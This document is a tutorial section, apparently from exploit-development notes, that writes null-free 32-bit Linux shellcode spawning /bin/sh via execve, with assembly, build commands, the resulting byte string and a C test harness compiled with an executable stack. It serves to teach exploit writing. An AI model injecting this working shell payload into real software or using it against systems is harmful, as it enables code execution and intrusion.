# Spawn-shell shellcode
In this section I am going to write shellcode that pops a /bin/sh shell.  
To create this, we are going to write assembly code first and this time,  
we are going to avoid getting zero's in the byte dump.  
  
To obtain a shell, we have to execute the program located on /bin/sh, this can be done with  
the system call function execve(). If we look at the man page of execve(),  
we can see that it has 3 parameters.  

``` C++
// https://linux.die.net/man/2/execve
int execve(const char *pathname, char *const argv[],
                  char *const envp[]);
```

The first parameters will contain a string to a path of the program to execute.  
The string //bin/sh has 8 characters, so it will fit in 2 32 bit addresses.  
First we push the zero byte to the stack, so that the /bin/sh string will have a string terminator,  
when it runs, but not in the code. The string //bin/sh needs to be put in hexadecimal  
values and reversed. It needs to be reversed because the program has a little endianess  
system.  
  
```asm

xor eax, eax            ; eax = 0 -> string terminator
push eax                ; push the string terminator
push 0x68732f6e         ; pushes the string 'hs/n'
push 0x69622f2f         ; pushes the string 'ib//'

; this makes '\0hs/nib//' -> reversed -> '//bin/sh\0'
; The \0 is the string terminator which is stored in the xor'red eax register

mov ebx, esp            ; move the string in the stack to ebx
```
  
For the other parameters in the execve() function we will pass a zero,  
because we don't need them. The code will eventually look like this.
  
spawn_shell.asm
```asm
section .text
global _start

_start:
        xor eax, eax
        push eax                ; string terminator

        ; //bin/sh
        push 0x68732f6e
        push 0x69622f2f
        
        mov ebx, esp            ; move stack buffer to ebx
        xor ecx, ecx
        xor edx, edx
        mov al, 0xb             ; execve()
        int 0x80
```  
  
As you can see, the execve() has a syscall value of 11, this is  
found in the unistd.h header file.   
The file-location is at: /usr/include/asm/unistd.h  
  
To compile the assembly code:  
```bash
nasm -f elf spawn_shell.asm
ld -m elf_i386 spawn_shell.o -o spawn_shell32
```
  
And extract the bytes with:  
```bash
objdump -d ./spawn_shell -M intel
```

The shellcode will be something like this:
``` Python
shellcode = \
  "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
# size of 23 characters
```

For testing the shellcode, we are going to create  
a small C program.
The code for the program is
```C++
// tester.c:
include <iostream>

char *shell = "shellcode ...";

int main() {

        void (*func)();
        func = (void(*)())shell;
        (*func)();
}
```
  
Compile the tester and execute  
```bash
g++ -o shellcode_tester tester.c --no-warnings -m32 -z execstack
./shellcode_tester
```
